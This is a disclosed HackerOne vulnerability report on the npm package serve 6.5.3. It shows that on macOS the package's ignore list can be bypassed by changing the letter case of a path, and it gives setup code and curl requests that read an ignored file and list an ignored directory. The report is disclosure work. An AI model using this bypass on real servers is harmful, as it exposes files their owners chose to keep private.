# [serve] Directory listing and File access even when they have been set to be ignored

## Report Details
- **Report ID**: 330650
- **URL**: https://hackerone.com/reports/330650
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-03-28T06:51:07.059Z
- **Disclosed**: 2018-05-31T19:18:43.353Z

## Reporter
- **Username**: tungpun
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a vulnerability in **serve** on macOS.
It allows listing directory and reading local files on the target server.

# Module

**module name:** serve
**version:** 6.5.3
**npm page:** `https://www.npmjs.com/package/serve`

## Module Description

Ever wanted to share a project on your network by running just a command? Then this module is exactly what you're looking for: It provides a neat interface for listing the directory's contents and switching into sub folders.

In addition, it's also awesome when it comes to serving static sites!

# Vulnerability

## Steps To Reproduce:

*On macOS:*

* Install **serve**:

`$ npm i serve`

* Create an application that uses **serve** for file serving listing and set a few folders and files in the `ignore` config.

```
const serve = require('serve')
const server = serve(__dirname, {
      port: 6060,
      ignore: ['sec', 'secret.html']
})
```

* Run the app

`$ node app.js`

* Now, the current directory will be served by this module on port `6060` with the exception of folder `sec` and file `secret.html`

* If we try to request these ignored files/directories, we get a `Not Found` error

```
$ curl --path-as-is 'http://127.0.0.1:6060/secret.html'
Not Found
```
or if we replace `e` character with URI encoded form `%65`, it still be ignored:

```
$ curl --path-as-is 'http://127.0.0.1:6060/s%65cret.html'
Not Found
```

* However, I found a way to access that file by using uppercase format.

```
$ curl --path-as-is 'http://127.0.0.1:6060/sECret.html'
This is secret content!!
```

To list an *ignored* directory:

`http://127.0.0.1:6060/sEc`

{F279417}

## Supporting Material/References:

* macOS High Sierra 10.13.3
* node v8.10.0
* npm 5.6.0
* Chrome Version 65.0.3325.162 (Official Build) (64-bit)

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

It bypasses the ignore files/directories feature and allows an attacker to read a file or list the directory that the victim has not allowed access to.

## Attachments
- serve.png
